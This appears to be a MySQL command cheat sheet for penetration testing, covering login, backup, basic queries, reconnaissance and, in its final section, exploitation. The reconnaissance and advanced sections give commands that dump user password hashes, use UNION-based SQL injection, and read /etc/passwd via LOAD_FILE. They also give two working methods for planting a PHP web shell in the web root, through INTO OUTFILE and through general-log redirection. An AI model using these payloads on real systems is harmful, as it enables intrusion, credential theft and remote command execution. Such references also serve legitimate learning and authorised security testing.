### 1. Terminal (Login, Logout, Backup)

Commands for the Linux terminal (not within the SQL console).

- `mysql -u root -h 10.10.10.10` — standard login.
- `mysql -u root -h 10.10.10.10 --ssl=0` (or `--skip-ssl`) — unencrypted login.
- `mysql -u user -p` — login with a password prompt.
- `mysql -u user -pPass123` — login with a password in the string (without a space after `-p`).
- `mysql -u root -P 3307` — non-standard port (strictly uppercase `-P`).
- `mysqldump -u root -p db_name > backup.sql` — dump (copy) the database to a file.
- `mysql -u root -p db_name < backup.sql` — restore a database from a file.
- `exit` (or `quit`) — exit SQL.
### 2. Structure and Basic SQL (CRUD, Search)
Executed within the SQL console. Required at the end with `;`.

**Navigation and Management:**
- `SHOW DATABASES;` — list databases.
- `CREATE DATABASE db_name;` — create a database.
- `USE db_name;` — switch to a database.
- `SHOW TABLES;` — list tables in the current database.
- `DESCRIBE table_name;` — table structure (columns and data types).
- `SHOW CREATE TABLE table_name;` — exact table creation code (useful for relationships).

**Reading and filtering (SELECT):**

- `SELECT * FROM table_name;` — output all.
- `SELECT col1, col2 FROM table_name;` — output specific columns.
- `SELECT * FROM table_name WHERE col1 = 'admin';` — strict filter.
- `SELECT * FROM table_name WHERE col1 LIKE '%admin%';` — wildcard search.
- `SELECT * FROM table_name ORDER BY col1 DESC LIMIT 5;` — sort (DESC — descending, ASC — ascending) and limit (only the first 5).

**Write, update, delete:**

- `INSERT INTO table_name (col1, col2) VALUES ('val1', 'val2');` — add a row.
- `UPDATE table_name SET col1 = 'new_val' WHERE id = 1;` — update (it's important to use `WHERE`).
- `DELETE FROM table_name WHERE id = 1;` — delete a row.
### 3. Reconnaissance and Administration

Collecting information about the environment and users.

- `SELECT version();` — DBMS version.
- `SELECT user();` — current user.
- `SELECT @@version_compile_os;` — server OS.
- `SHOW GRANTS FOR CURRENT_USER;` — current user's permissions.
- `SHOW GRANTS FOR 'user'@'localhost';` — any user's permissions.
- `SELECT user, password FROM mysql.user;` — dump all users and their hashes (for MySQL < 5.7).
- `SELECT user, authentication_string FROM mysql.user;` — dump users and hashes (for MySQL >= 5.7).
- `SHOW PROCESSLIST;` — active queries (requires root).
### 4. Advanced Techniques (Joins, Injections, Shells)

Complex queries and vulnerability exploitation (requires root or FILE privileges).

**Joins and Joins:**

- `SELECT * FROM t1 INNER JOIN t2 ON t1.id = t2.user_id;` — join by key.
- `SELECT 1, 2, 3 UNION SELECT username, password, email FROM users;` — concatenate output (the basis of UNION SQLi).

**Reading and Writing Files (Hacking):**

- `SHOW VARIABLES LIKE 'secure_file_priv';` — whether files can be read/written (`empty` = allowed everywhere, `NULL` = not allowed).
- `SELECT LOAD_FILE('/etc/passwd');` — read a file.
- `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` — write a web shell to the server.

**Log Manipulation (Alternative Shell):**

- `SELECT @@global.general_log;` — check logging.
- `SET GLOBAL general_log = 'ON';` — enable logging.
- `SET GLOBAL general_log_file = '/var/www/html/shell.php';` — redirect the log to a PHP file.
- `SELECT '<?php system($_GET["cmd"]); ?>';` — execute the query (it will be written to the log, which will become a PHP file).
